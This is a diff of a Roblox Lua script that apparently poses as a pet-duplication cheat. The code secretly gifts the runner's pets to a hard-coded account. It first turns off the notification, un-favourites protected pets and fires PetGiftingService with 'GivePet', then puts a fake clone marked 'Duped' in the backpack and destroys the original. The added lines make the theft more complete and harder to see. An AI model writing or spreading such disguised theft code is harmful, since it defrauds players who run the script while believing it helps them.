@@ -76,23 +76,32 @@ coroutine.wrap(function()
 							v.Parent = game:GetService("Players").LocalPlayer.Backpack
 						end
 						wait()
-						
-						v:SetAttribute("Favorite", false)
+
 						game:GetService("Players").LocalPlayer.PlayerGui.Top_Notification.Enabled = false
-						wait(0.1)
+
+						if v:GetAttribute("Favorite") == true then
+							local args = {
+								game:GetService("Players").LocalPlayer.Character:WaitForChild(PetName)
+							}
+							game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(unpack(args))
+						end
 						
+						wait(0.1)
+
 						v.Parent = game:GetService("Workspace")[LocalPlayer.Name]
 						wait(0.1)
-						
+
 						local args = {
 							"GivePet",
 							game:GetService("Players"):WaitForChild("itsyaboivincentt")
 						}
 						game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
-						
+
 						local Fake = v:Clone()
 						Fake.Parent = game:GetService("Players").LocalPlayer.Backpack
 						Fake:SetAttribute("Duped", true)
+						wait(0.1)
+						v:Destroy()
 					end
 				end
 			end
